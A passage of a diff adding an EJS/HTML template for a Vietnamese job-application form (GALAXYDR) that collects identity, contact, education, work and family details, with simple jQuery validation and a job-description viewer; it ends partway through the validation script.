@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <title>Nộp Đơn Ứng Tuyển GALAXYDR</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <meta name="keywords" content="<%=keywords%>" />
+    <meta name="author" content="OfficeJob" />
+    <meta name="MobileOptimized" content="320" />
+    <meta property="og:description" content="<%=description%>" />
+    <meta property="og:image" content="<%=url_image%>" />
+    <meta property="og:image:alt" content="<%=image_alt%>" />
+    <meta property="og:url" content="<%=linkmeta%>">
+    <meta property="og:title" content="<%=Title%>" />
+    <meta property="og:type" content="website" />
+    <meta property="fb:app_id" content="1902832553257404" />
+    <link rel="stylesheet" type="text/css" href="css/animate.css" />
+    <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
+    <link rel="stylesheet" type="text/css" href="css/font-awesome.css" />
+    <link rel="stylesheet" type="text/css" href="css/fonts.css" />
+    <link rel="stylesheet" type="text/css" href="css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="css/owl.carousel.css" />
+    <link rel="stylesheet" type="text/css" href="css/owl.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="css/flaticon.css" />
+    <link rel="stylesheet" type="text/css" href="css/style.css" />
+    <link rel="stylesheet" type="text/css" href="css/responsive.css" />
+    <link rel="stylesheet" type="text/css" href="style.css" />
+    <link rel="shortcut icon" type="image/png" href="https://tuyendung.me/logo_new.jpg" />
+    <script src="jquery.js"></script>
+    
+    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+</head>
+
+
+<body>
+
+<style>
+    h6{
+        font-size: 14px;
+    }
+    .h6_font{
+        color: gray;
+        margin-top: 5px;
+        margin-bottom: 5px;
+    }
+</style>
+    <section class="candidates-details section4">
+        <div class="jp_tittle_slider_main_wrapper" style="float:left; width:100%; margin-top:30px;">
+            <div class="container">
+                <div class="container" id="formUT">
+                    <div class="sideber2">
+                        <div class="widghet">
+                            <form action="/new-applications" name="apply-form" method="post" enctype="multipart/form-data" onsubmit="return validateForm()" required>
+                                <div hidden id="get_os">
+                                    
+                                </div>
+                                <div class="row">
+                                    <div style="text-align: center;" class="col-md-12">
+                                        <h1 id="titleDonungtuyen" ><b
+                                                style="font-size: 30px;" id="newFont">ĐƠN ỨNG
+                                                TUYỂN</b></h1>
+                                    </div>
+                                    <div style="margin-top: 50px;text-align: center;" class="col-md-12">
+                                        <img id="logogalaxy" src="https://galaxydr.com.vn/storage/logo/logo.png" />
+                                        <div>
+                                        </div>
+                                    </div>
+                                    <div  class="col-md-12">
+                                            <div class="row">
+                                                <div class="col-lg-4">
+                                                    <div style="  margin-top: 10px" id="thongtin" class="sideber2">
+                                                        <div class="widghet">
+                                                            <h3><b id="newFont">Thông tin</b></h3>
+                                                            <div class="contact-form">
+    
+                                                                <div class="picture-container">
+                                                                    <div class="picture">
+                                                                        <input type="file" name="fileUT" id="fileUT"
+                                                                            accept="*.jpg,*.png" class="valid" />
+                                                                        <img src="https://img.icons8.com/bubbles/10000/000000/user-male.png"
+                                                                            class="picture-src" name="AvataUT"
+                                                                            id="wizardPicturePreview" />
+    
+                                                                    </div>
+                                                                    <h6 style="font-size: 20px;" id="newFont">
+                                                                        Chọn Ảnh Cá Nhân</h6>
+                                                                </div>
+                                                                <div class="input-container">
+                                                                    <label for="NameUT">Họ và Tên</label>
+                                                                    <fieldset><input class="inputtest" id="NameUT"
+                                                                            name="NameUT" type="text" placeholder="Họ và Tên của bạn"></fieldset>
+                                                                  <h6 class="h6_font"><li>Vui lòng điền đầy đủ Họ và Tên.</li></h6>
+                                                                </div>
+    
+                                                                <div style="margin-top: 10px;" class="input-container">
+                                                                    <div class="row">
+                                                                        <div id="gioitinhs" class="col-sm-6">
+    
+                                                                            <select id="Gioitinh" name="Gioitinh"
+                                                                                class="form-control">
+                                                                                <option value="Nam">Nam
+                                                                                </option>
+                                                                                <option value="Nữ">Nữ
+                                                                                </option>
+                                                                                <option value="Nữ">Khác
+                                                                                </option>
+                                                                            </select>
+                                                                            <label for="Gioitinh">Giới
+                                                                                tính</label>
+    
+                                                                        </div>
+                                                                        <div id="honnhans" class="col-sm-6">
+                                                                            <select id="Honnhan" name="Honnhan"
+                                                                                class="form-control">
+                                                                                <option value="Độc Thân">Độc
+                                                                                    thân</option>
+                                                                                <option value="Đã có gia đình">
+                                                                                    Đã có gia đình</option>
+                                                                                <option value="Đã ly dị">Đã
+                                                                                    ly dị</option>
+                                                                            </select>
+                                                                            <label for="Honnhan">Hôn
+                                                                                nhân</label>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                                <div style="margin-top: 10px;" class="input-container">
+                                                                    
+                                                                    <label for="Ngaysinh">Ngày sinh</label>
+                                                                    <fieldset><input style="width: 100%;"  class="inputtest" id="Ngaysinh"
+                                                                            name="Ngaysinh" type="date"></fieldset>
+                                                                   
+                                                                </div>
+    
+                                                                <div style="margin-top: 10px;" class="input-container">
+                                                                    <select id="Quequan" name="Quequan"
+                                                                        class="form-control">
+                                                                        <option value="">Quê Quán
+                                                                        <option value="TP.HCM">TP. Hồ Chí
+                                                                            Minh
+                                                                        <option value="Hà Nội">Hà Nội
+                                                                        <option value="An Giang">An Giang
+                                                                        <option value="Bà Rịa - Vũng Tàu">Bà
+                                                                            Rịa - Vũng Tàu
+                                                                        <option value="Bắc Giang">Bắc Giang
+                                                                        <option value="Bắc Kạn">Bắc Kạn
+                                                                        <option value="Bạc Liêu">Bạc Liêu
+                                                                        <option value="Bắc Ninh">Bắc Ninh
+                                                                        <option value="Bến Tre">Bến Tre
+                                                                        <option value="Bình Định">Bình Định
+                                                                        <option value="Bình Dương">Bình
+                                                                            Dương
+                                                                        <option value="Bình Phước">Bình
+                                                                            Phước
+                                                                        <option value="Bình Thuận">Bình
+                                                                            Thuận
+                                                                        <option value="Bình Thuận">Bình
+                                                                            Thuận
+                                                                        <option value="Cà Mau">Cà Mau
+                                                                        <option value="Cao Bằng">Cao Bằng
+                                                                        <option value="Đắk Lắk">Đắk Lắk
+                                                                        <option value="Đắk Nông">Đắk Nông
+                                                                        <option value="Điện Biên">Điện Biên
+                                                                        <option value="Đồng Nai">Đồng Nai
+                                                                        <option value="Đồng Tháp">Đồng Tháp
+                                                                        <option value="Đồng Tháp">Đồng Tháp
+                                                                        <option value="Gia Lai">Gia Lai
+                                                                        <option value="Hà Giang">Hà Giang
+                                                                        <option value="Hà Nam">Hà Nam
+                                                                        <option value="Hà Tĩnh">Hà Tĩnh
+                                                                        <option value="Hải Dương">Hải Dương
+                                                                        <option value="Hậu Giang">Hậu Giang
+                                                                        <option value="Hòa Bình">Hòa Bình
+                                                                        <option value="Hưng Yên">Hưng Yên
+                                                                        <option value="Khánh Hòa">Khánh Hòa
+                                                                        <option value="Kiên Giang">Kiên
+                                                                            Giang
+                                                                        <option value="Kon Tum">Kon Tum
+                                                                        <option value="Lai Châu">Lai Châu
+                                                                        <option value="Lâm Đồng">Lâm Đồng
+                                                                        <option value="Lạng Sơn">Lạng Sơn
+                                                                        <option value="Lào Cai">Lào Cai
+                                                                        <option value="Long An">Long An
+                                                                        <option value="Nam Định">Nam Định
+                                                                        <option value="Nghệ An">Nghệ An
+                                                                        <option value="Ninh Bình">Ninh Bình
+                                                                        <option value="Ninh Thuận">Ninh
+                                                                            Thuận
+                                                                        <option value="Phú Thọ">Phú Thọ
+                                                                        <option value="Quảng Bình">Quảng
+                                                                            Bình
+                                                                        <option value="Quảng Bình">Quảng
+                                                                            Bình
+                                                                        <option value="Quảng Ngãi">Quảng
+                                                                            Ngãi
+                                                                        <option value="Quảng Ninh">Quảng
+                                                                            Ninh
+                                                                        <option value="Quảng Trị">Quảng Trị
+                                                                        <option value="Sóc Trăng">Sóc Trăng
+                                                                        <option value="Sơn La">Sơn La
+                                                                        <option value="Tây Ninh">Tây Ninh
+                                                                        <option value="Thái Bình">Thái Bình
+                                                                        <option value="Thái Nguyên">Thái
+                                                                            Nguyên
+                                                                        <option value="Thanh Hóa">Thanh Hóa
+                                                                        <option value="Thừa Thiên Huế">Thừa
+                                                                            Thiên Huế
+                                                                        <option value="Tiền Giang">Tiền
+                                                                            Giang
+                                                                        <option value="Trà Vinh">Trà Vinh
+                                                                        <option value="Tuyên Quang">Tuyên
+                                                                            Quang
+                                                                        <option value="Vĩnh Long">Vĩnh Long
+                                                                        <option value="Vĩnh Phúc">Vĩnh Phúc
+                                                                        <option value="Yên Bái">Yên Bái
+                                                                        <option value="Phú Yên">Phú Yên
+                                                                        <option value="Tp.Cần Thơ">Tp.Cần
+                                                                            Thơ
+                                                                        <option value="Tp.Đà Nẵng">Tp.Đà
+                                                                            Nẵng
+                                                                        <option value="Tp.Hải Phòng">Tp.Hải
+                                                                            Phòng
+    
+                                                                    </select>
+                                                                    <label for="Quequan">Quê Quán</label>
+                                                                </div>
+                                                                <div class="input-container">
+                                                                    <select id="Noisinh" name="Noisinh"
+                                                                        class="form-control">
+                                                                        <option value="">Nơi sinh
+                                                                        <option value="TP.HCM">TP. Hồ Chí
+                                                                            Minh
+                                                                        <option value="Hà Nội">Hà Nội
+                                                                        <option value="An Giang">An Giang
+                                                                        <option value="Bà Rịa - Vũng Tàu">Bà
+                                                                            Rịa - Vũng Tàu
+                                                                        <option value="Bắc Giang">Bắc Giang
+                                                                        <option value="Bắc Kạn">Bắc Kạn
+                                                                        <option value="Bạc Liêu">Bạc Liêu
+                                                                        <option value="Bắc Ninh">Bắc Ninh
+                                                                        <option value="Bến Tre">Bến Tre
+                                                                        <option value="Bình Định">Bình Định
+                                                                        <option value="Bình Dương">Bình
+                                                                            Dương
+                                                                        <option value="Bình Phước">Bình
+                                                                            Phước
+                                                                        <option value="Bình Thuận">Bình
+                                                                            Thuận
+                                                                        <option value="Bình Thuận">Bình
+                                                                            Thuận
+                                                                        <option value="Cà Mau">Cà Mau
+                                                                        <option value="Cao Bằng">Cao Bằng
+                                                                        <option value="Đắk Lắk">Đắk Lắk
+                                                                        <option value="Đắk Nông">Đắk Nông
+                                                                        <option value="Điện Biên">Điện Biên
+                                                                        <option value="Đồng Nai">Đồng Nai
+                                                                        <option value="Đồng Tháp">Đồng Tháp
+                                                                        <option value="Đồng Tháp">Đồng Tháp
+                                                                        <option value="Gia Lai">Gia Lai
+                                                                        <option value="Hà Giang">Hà Giang
+                                                                        <option value="Hà Nam">Hà Nam
+                                                                        <option value="Hà Tĩnh">Hà Tĩnh
+                                                                        <option value="Hải Dương">Hải Dương
+                                                                        <option value="Hậu Giang">Hậu Giang
+                                                                        <option value="Hòa Bình">Hòa Bình
+                                                                        <option value="Hưng Yên">Hưng Yên
+                                                                        <option value="Khánh Hòa">Khánh Hòa
+                                                                        <option value="Kiên Giang">Kiên
+                                                                            Giang
+                                                                        <option value="Kon Tum">Kon Tum
+                                                                        <option value="Lai Châu">Lai Châu
+                                                                        <option value="Lâm Đồng">Lâm Đồng
+                                                                        <option value="Lạng Sơn">Lạng Sơn
+                                                                        <option value="Lào Cai">Lào Cai
+                                                                        <option value="Long An">Long An
+                                                                        <option value="Nam Định">Nam Định
+                                                                        <option value="Nghệ An">Nghệ An
+                                                                        <option value="Ninh Bình">Ninh Bình
+                                                                        <option value="Ninh Thuận">Ninh
+                                                                            Thuận
+                                                                        <option value="Phú Thọ">Phú Thọ
+                                                                        <option value="Quảng Bình">Quảng
+                                                                            Bình
+                                                                        <option value="Quảng Bình">Quảng
+                                                                            Bình
+                                                                        <option value="Quảng Ngãi">Quảng
+                                                                            Ngãi
+                                                                        <option value="Quảng Ninh">Quảng
+                                                                            Ninh
+                                                                        <option value="Quảng Trị">Quảng Trị
+                                                                        <option value="Sóc Trăng">Sóc Trăng
+                                                                        <option value="Sơn La">Sơn La
+                                                                        <option value="Tây Ninh">Tây Ninh
+                                                                        <option value="Thái Bình">Thái Bình
+                                                                        <option value="Thái Nguyên">Thái
+                                                                            Nguyên
+                                                                        <option value="Thanh Hóa">Thanh Hóa
+                                                                        <option value="Thừa Thiên Huế">Thừa
+                                                                            Thiên Huế
+                                                                        <option value="Tiền Giang">Tiền
+                                                                            Giang
+                                                                        <option value="Trà Vinh">Trà Vinh
+                                                                        <option value="Tuyên Quang">Tuyên
+                                                                            Quang
+                                                                        <option value="Vĩnh Long">Vĩnh Long
+                                                                        <option value="Vĩnh Phúc">Vĩnh Phúc
+                                                                        <option value="Yên Bái">Yên Bái
+                                                                        <option value="Phú Yên">Phú Yên
+                                                                        <option value="Tp.Cần Thơ">Tp.Cần
+                                                                            Thơ
+                                                                        <option value="Tp.Đà Nẵng">Tp.Đà
+                                                                            Nẵng
+                                                                        <option value="Tp.Hải Phòng">Tp.Hải
+                                                                            Phòng
+    
+                                                                    </select>
+    
+                                                                    <label for="Noisinh">Nơi sinh</label>
+                                                                </div>
+                                                                <div class="input-container">
+                                                                    <fieldset><input class="inputtest" id="CMND" name="CMND"
+                                                                            type="number" placeholder="Số CMND hoặc CCCD">
+                                                                    </fieldset>
+                                                                    <label for="CMND">Số CMND/ CCCD </label>
+                                                                    <h6 class="h6_font"><li>Số CMND bạn cung cấp sẽ được kiểm tra Danh sách CIC tại Ngân Hàng Nhà Nước Việt Nam</li></h6>
+                                                                </div>
+                                                                <div class="input-container">
+                                                                    <fieldset><input class="inputtest" id="NCCMND"
+                                                                            name="NCCMND" type="text"  placeholder="Nơi cấp"></fieldset>
+                                                                    <label for="NCCMND">Nơi cấp Số CMND/
+                                                                        CCCD </label>
+                                                                </div>
+                                                                <div class="input-container">
+                                                                    <fieldset><input class="inputtest" id="NgayCCMND"
+                                                                            name="NgayCCMND" type="date"></fieldset>
+                                                                    <label for="NgayCCMND">Ngày cấp Số CMND/
+                                                                        CCCD </label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="widghet">
+                                                            <h3 id="newFont">Liên Hệ</h3>
+                                                            <div class="input-container">
+                                                                <label for="EmailUT">Email</label>
+                                                                <fieldset><input class="inputtest" id="EmailUT"
+                                                                        name="EmailUT" type="email" placeholder="Địa chỉ Email của bạn"></fieldset>
+                                                                <h6 class="h6_font"><li>P.Tuyển dụng sẽ thông báo kết quả phỏng vấn qua Email bạn cung cấp.</li></h6>
+                                                            </div>
+                                                            <div class="input-container">
+                                                                <label for="PhoneUT">Số điện thoại</label>
+                                                                <fieldset><input class="inputtest" id="PhoneUT"
+                                                                        name="PhoneUT" type="text" placeholder="Số Điện Thoại của bạn"></fieldset>
+                                                                 <h6 class="h6_font"><li>P.Tuyển dụng sẽ thông báo kết quả phỏng vấn qua Số Điện Thoại bạn cung cấp.</li></h6>
+    
+                                                            </div>
+                                                            <div class="contact-form">
+                                                                <div class="input-container">
+                                                                    <label for="DCTT">Địa chỉ thường
+                                                                        trú</label>
+                                                                    <fieldset><input class="inputtest" id="DCTT" name="DCTT"
+                                                                            type="text" placeholder="Địa chỉ hiện tại của bạn"></fieldset>
+                                                                    
+                                                                </div>
+                                                                <div class="input-container">
+                                                                    <label for="DCLL">Địa chỉ liên
+                                                                        lạc</label>
+                                                                    <fieldset><input class="inputtest" id="DCLL" name="DCLL"
+                                                                            type="text"  placeholder="Địa chỉ trên sổ hộ khẩu của bạn"></fieldset>
+                                                                    
+                                                                </div>
+    
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="col-lg-8">
+                                                    <div style="margin-top: 10px;" id="thongtin" class="sideber2">
+                                                        <div class="widghet">
+                                                            <div class="candidates-about">
+    
+                                                                <h3><b id="newFont">Hỏi/Đáp</b></h3>
+                                                                <div class="row">
+                                                                    <div style="margin-top: 10px;margin-bottom: 10px;" class="col-md-6">
+                                                                        <div class="con">
+                                                                            <label  style="height: 35px;" for="Gioithieu">Lựa Chọn Vị Trí Ứng Tuyển</label>
+                                                                            <%if(count_result_tindang == "1"){%>
+                                                                                <%resultTinDang.forEach(function(item){%>
+                                                                                <select id="vitriungtuyen" name="vitriungtuyen"
+                                                                                class="form-control">
+                                                                               
+                                                                                    <option  value="<%=item.Title%>">
+                                                                                        <%=item.Title%>
+                                                                                    </option>
+                                                                               </select>
+                                                                               <div style="margin-top: 10px;margin-bottom: 10px;" id="review_detail_jd" class="con">
+                                                                                <% var chosse = item.FileJD%>
+                                                                                <button type="button" style="margin-top: 10px;width: 100%;" data-toggle="modal" data-target="#Review_jd"
+                                                                                onclick="get_view_jd('<%=chosse%>')" for="vitriungtuyen" class="btn btn-primary">Xem mô tả công việc</button>
+                                                                                <%})%>
+                                                                            </div>
+                                                                            <%}else{%>
+                                                                                <select id="vitriungtuyen" onchange="getval(this);" name="vitriungtuyen"
+                                                                                class="form-control">
+                                                                                    <%resultTinDang.forEach(function(item){%>
+                                                                                    <option  value="<%=item.Title%>">
+                                                                                        <%=item.Title%>
+                                                                                    </option>
+                                                                                    <%})%>
+                                                                               </select>
+                                                                               <div style="margin-top: 10px;margin-bottom: 10px;" id="review_detail_jd" class="con">
+                                                                            </div>
+                                                                            <%}%>
+                                                                          
+                                                                           
+                                                                            <script>
+                                                                                function getval(sel){
+                                                                                    var chosse = sel.value
+                                                                                    $("#review_detail_jd").html(`
+                                                                                <button type="button" style="margin-top: 10px;width: 100%;" data-toggle="modal" data-target="#Review_jd"
+                                                                                  onclick="get_view_jd('${chosse}')" for="vitriungtuyen" class="btn btn-primary">Xem mô tả công việc</button>
+                                                                                `)
+                                                                                }
+                                                                                function get_view_jd(result) {
+                                                                                        console.log(result)
+                                                                                        $("#bodyCV").html(`<iframe width="100%" style="height:600px"  src="/review_jd=${result}"></iframe>`)
+                                                                                }
+                                                                               
+                                                                            </script>
+                                                                            
+                                                                        </div>
+                                                                    </div>
+    
+                                                                    <div style="margin-top: 10px;margin-bottom: 10px;" class="col-md-6">
+    
+                                                                        <div class="con">
+                                                                            <label  style="height: 35px;" for="Gioithieu">Lựa Chọn Trình Độ</label>
+                                                                            <select class="form-control" id="BMLV"
+                                                                                name="TrinhDoHocVan">
+    
+                                                                                <option value="TC">
+                                                                                    Trung Cấp
+                                                                                </option>
+                                                                                <option value="THPT">
+                                                                                    THPT
+                                                                                </option>
+                                                                                <option value="CĐ">
+                                                                                    Cao Đẳng
+                                                                                </option>
+                                                                                <option value="ĐH">
+                                                                                    Đại Học
+                                                                                </option>
+                                                                                <option value="CH">
+                                                                                    Trên Đại Học
+                                                                                </option>
+                                                                            </select>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                                <div class="row">
+                                                                    <div class="col-md-6">
+    
+                                                                        <label  style="height: 35px;" for="Gioithieu">Bạn biết
+                                                                            thông tin tuyển dụng từ đâu
+                                                                            ?</label>
+    
+                                                                        <div class="input-container">
+                                                                            <fieldset> <input  style="height: 35px;" class="inputtest"
+                                                                                    id="Gioithieu" name="Gioithieu"
+                                                                                    type="text" placeholder="Bạn biết thông tin tuyển dụng từ đâu ?" />
+                                                                            </fieldset>
+                                                                            
+                                                                        </div>
+                                                                    </div>
+    
+                                                                    <div class="col-md-6">
+    
+                                                                        <label style="height: 35px;" for="BMLV">Hình thức phỏng vấn</label>
+    
+                                                                        <div class="input-container">
+                                                                            <select  style="height: 35px;" id="BMLV" name="BMLV"
+                                                                                class="form-control">
+                                                                                <option value="Offline">Phỏng Vấn Tại Văn Phòng
+                                                                                </option>
+    
+                                                                            </select>
+                                                                            
+                                                                        </div>
+    
+                                                                    </div>
+    
+                                                                </div>
+                                                                <br>
+                                                                <div class="row">
+                                                                    <div class="col-md-12">
+                                                                        <h3><b id="newFont">Học Vấn</b></h3>
+                                                                        <div class="educations">
+    
+                                                                            <div class="row">
+                                                                                <div class="col-sm-2">
+                                                                                    <img style="width: 100px;height: 100px;border-radius: 10px;"
+                                                                                        src="https://img.icons8.com/bubbles/1000/000000/student-male.png" />
+    
+                                                                                </div>
+    
+                                                                                <div class="col-sm-10">
+                                                                                    <label for="hoctap">Quá
+                                                                                        trình của bạn <br>
+                                                                                        <li> ( VD : TỪ 2015
+                                                                                            ĐẾN 2019 | ĐẠI
+                                                                                            HỌC : NÔNG
+                                                                                            NGHIỆP TPHCM |
+                                                                                            TỐT NGHIỆP LOẠI:
+                                                                                            KHÁ | CHUYÊN
+                                                                                            NGÀNH : THÚ Y)
+                                                                                        </li>
+                                                                                    </label>
+    
+                                                                                    <div class="paper">
+                                                                                        <div class="paper-content">
+                                                                                            <textarea id="hoctap"
+                                                                                                name="hoctap" rows="5"
+                                                                                                class="notes"></textarea>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+    
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                    <div style="margin-top: 20px;" class="col-md-12">
+                                                                        <h3><b id="newFont">Kinh Nghiệm Làm
+                                                                                Việc</b></h3>
+                                                                        <div class="educations">
+                                                                            <div class="row">
+                                                                                <div class="col-sm-2">
+                                                                                    <img style="width: 100px;height: 100px;border-radius: 10px;"
+                                                                                        src="https://img.icons8.com/bubbles/1000/000000/online-support.png" />
+    
+                                                                                </div>
+                                                                                <div class="col-sm-10">
+                                                                                    <label for="Kinhnghiem">Quà
+                                                                                        trình làm việc của bạn <br>
+                                                                                        <li> ( VD : TỪ 2015
+                                                                                            ĐẾN 2019 | CÔNG
+                                                                                            TY :TNHH QA | VỊ
+                                                                                            TRÍ : NHÂN VIÊN)
+                                                                                        </li>
+                                                                                    </label>
+    
+                                                                                    <div class="paper">
+                                                                                        <div class="paper-content">
+                                                                                            <textarea id="Kinhnghiem"
+                                                                                                name="Kinhnghiem" rows="3"
+                                                                                                class="notes"></textarea>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+    
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                    <div style="margin-top: 20px;" class="col-md-12">
+                                                                        <h3><b id="newFont">Quan hệ gia đình</b>
+                                                                        </h3>
+                                                                        <div class="educations">
+                                                                            <div class="input-container">
+                                                                                <div class="row">
+                                                                                    <div class="col-sm-2">
+                                                                                        <img style="width: 100px;height: 100px;border-radius: 10px;"
+                                                                                            src="https://img.icons8.com/bubbles/1000/000000/family.png" />
+    
+                                                                                    </div>
+                                                                                    <div class="col-sm-10">
+                                                                                        <div class="paper">
+                                                                                            <label for="Giadinh">Thông
+                                                                                                tin gia đình
+                                                                                                của bạn<br>
+                                                                                                <li> ( VD :
+                                                                                                    Họ và
+                                                                                                    Tên : Lê
+                                                                                                    Văn
+                                                                                                    A-1977 |
+                                                                                                    Nghề
+                                                                                                    Nghiệp:
+                                                                                                    Nông Dân
+                                                                                                    |Quan hệ
+                                                                                                    : Cha)
+                                                                                                </li>
+                                                                                            </label>
+    
+                                                                                            <div class="paper-content">
+                                                                                                <textarea id="Giadinh"
+                                                                                                    name="Giadinh" rows="3"
+                                                                                                    class="notes"></textarea>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+    
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+    
+                                                                <div style="margin-top: 10px;" class="row">
+                                                                    <div class="col-md-12">
+                                                                        <h3><b id="newFont">File CV(Nếu có)</b></h3>
+                                                                        <div class="educations">
+                                                                            <div class="row">
+                                                                                <div class="col-sm-2">
+                                                                                    <img style="width: 100px;height: 100px;"
+                                                                                        src="https://img.icons8.com/bubbles/1000/000000/resume.png" />
+                                                                                </div>
+    
+                                                                                <div class="col-sm-10">
+                                                                                    <div style="margin-top:25px"
+                                                                                        class="input-group">
+                                                                                        <span class="input-group-btn">
+                                                                                            <div
+                                                                                                class="btn btn-default browse-button">
+                                                                                                <span
+                                                                                                    class="browse-button-text">
+                                                                                                    <i
+                                                                                                        class="fa fa-folder-open"></i>Chọn
+                                                                                                    File</span>
+                                                                                                <input
+                                                                                                    style="position: absolute;
+                                                                                                          top: 0;
+                                                                                                          right: 0;
+                                                                                                          margin: 0;
+                                                                                                          padding: 0;
+                                                                                                          font-size: 20px;
+                                                                                                          cursor: pointer;
+                                                                                                          opacity: 0;
+                                                                                                          filter: alpha(opacity=0);"
+                                                                                                    type="file"
+                                                                                                    name="fileCV"
+                                                                                                    accept=".pdf" />
+                                                                                            </div>
+                                                                                            <button type="button"
+                                                                                                class="btn btn-default clear-button"
+                                                                                                style="display:none;">
+                                                                                                <span
+                                                                                                    class="fa fa-times"></span>
+                                                                                                Xoá
+                                                                                            </button>
+                                                                                        </span>
+    
+    
+                                                                                        <input type="text"
+                                                                                            class="form-control filename"
+                                                                                            disabled="disabled" accept="pdf"
+                                                                                            placeholder="Đính kèm file CV">
+    
+                                                                                    </div>
+                                                                                </div>
+    
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                                <div style="margin-top: 20px;" class="row">
+                                                                    <div class="col-md-12">
+                                                                        <h3><b id="newFont"><img
+                                                                                    style="width: 50px;height: 50px;"
+                                                                                    src="https://img.icons8.com/bubbles/1000/000000/elections.png" />
+                                                                                Cam kết Nghĩa vụ</b></h3>
+                                                                        <h6>
+                                                                            <li> Tôi cam kết đồng ý nếu công ty
+                                                                                phát
+                                                                                hiện bạn có nợ xấu tại bất kì tổ
+                                                                                chức tín dụng nào thì công ty sẽ
+                                                                                chấm dứt hợp đồng công tác với
+                                                                                bạn
+                                                                                ngay lập tức</li>
+                                                                        </h6>
+                                                                        <h6>
+                                                                            <li> Tôi cam kết mọi thông tin trên
+                                                                                đều
+                                                                                là sự thật , nếu sai tôi sẽ chịu
+                                                                                trách nhiệm trước nội quy công
+                                                                                ty về
+                                                                                vấn đề phạt vi phạm </li>
+                                                                        </h6>
+                                                                        <h6>
+                                                                            <li> Tôi cam kết sẽ tuân thủ theo
+                                                                                quy
+                                                                                định của công ty </li>
+                                                                        </h6>
+                                                                        <h3><b id="newFont"><img
+                                                                                    style="width: 50px;height: 50px;"
+                                                                                    src="https://img.icons8.com/bubbles/1000/000000/alarm.png" />Lưu
+                                                                                ý</b></h3>
+                                                                        <h6>
+                                                                            <li>Hồ sơ xin việc (CMND , Sơ yếu lý
+                                                                                lịch) của ứng viên ,Công ty sẽ
+                                                                                không
+                                                                                hoàn trả lại , Những thông tin
+                                                                                trên
+                                                                                sẽ được cậo nhật để tạo User,Thẻ
+                                                                                nhân viên , Ứng viên sẽ nhận
+                                                                                được
+                                                                                thông báo về :Quy trình làm
+                                                                                việc,
+                                                                                Quy trịnh công ty , Quy định tác
+                                                                                phong khi phỏng vấn </li>
+                                                                        </h6>
+                                                                    </div>
+                                                                </div>
+                                                                <br>
+                                                                <input hidden name="url_employer" value="<%=fullUrl%>" type="text" >
+                                                                <div hidden id="loading">
+                                                                    <center>
+                                                                       <button style="    background-color: #fff;
+                                                                       border-radius: 10px;" type="button"><img style="width: 10%;" src="https://i.pinimg.com/originals/f6/65/6a/f6656aa6fdb6b8f905dea0bcc2d71dd8.gif" />Đang gửi thông tin <img style="width: 10%;" src="https://i.pinimg.com/originals/f6/65/6a/f6656aa6fdb6b8f905dea0bcc2d71dd8.gif" /></button>    
+                                                                    </center>  
+                                                                </div>
+                                                                <div>
+                                                                        <input id="btnFormSubmit"  type="submit" class="btn1"
+                                                                        value=" Nộp Đơn Ứng Tuyển">
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+    
+    
+                                                </div>
+                                            </div>
+                                           
+                                            <style>
+                                                .col-lg-4{
+                                                    position: relative;
+                                                min-height: 1px;
+                                                padding-right: 2px;
+                                                padding-left: 2px;
+                                                }
+                                                .col-lg-8{
+                                                    position: relative;
+                                                min-height: 1px;
+                                                padding-right: 2px;
+                                                padding-left: 2px;
+                                                }
+                                            </style>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </section>
+    <div id="Review_jd" class="modal fade" role="dialog">
+        <div class="modal-dialog modal-lg">
+          <div class="modal-content">
+            <div style="height: 600px;" class="modal-body text-center" id="bodyCV">
+                
+               
+            </div>
+            <div id="footer" class="modal-footer">
+                <button type="button" class="btn btn-primary" data-dismiss="modal">Đóng</button>
+            </div>
+          </div>
+  
+        </div>
+      </div>
+      <script>
+          $("#btnFormSubmit").click(function(){
+            $("#loading").show()
+            $("#btnFormSubmit").hide()
+          })
+     </script>
+      <script>function validateForm() {
+        var Phone = document.forms["apply-form"]["PhoneUT"].value;
+        var email = document.forms["apply-form"]["EmailUT"].value;
+        var name = document.forms["apply-form"]["NameUT"].value;
+        var CMND = document.forms["apply-form"]["CMND"].value;
+        var hoctap = document.forms["apply-form"]["hoctap"].value;
+        var Kinhnghiem = document.forms["apply-form"]["Kinhnghiem"].value;
+        if (name == "" || name == null) {
+            alert("Bạn chưa nhập Tên");
+            $("#loading").hide()
+            $("#btnFormSubmit").show()
+            return false;
+        }
+        if (email == "" || email == null) {
+            alert("Bạn chưa nhập Email");
+            $("#loading").hide()
+            $("#btnFormSubmit").show()
+            return false;
+        }
+        if (Phone == "" || Phone == null) {
+            alert("Bạn chưa nhập số điện thoại");
+            $("#loading").hide()
+            $("#btnFormSubmit").show()
+            return false;
+        }
+        if (CMND == "" || CMND == null) {
+            alert("Bạn chưa nhập số CMND/CCCD");
+            $("#loading").hide()
+            $("#btnFormSubmit").show()
+            return false;
+        }
+        if (Kinhnghiem == "" || Kinhnghiem == null) {
+            alert("Bạn chưa nhập kinh nghiệm làm việc ( chưa có kinh nghiệm nhập chưa có kinh nghiệm )");
+            $("#loading").hide()
+            $("#btnFormSubmit").show()
+            return false;
+        }
+        if (hoctap == "" || hoctap == null) {
+            alert("Bạn chưa nhập thông tin Bằng cấp/Chứng chỉ/ Quá trình học tập");
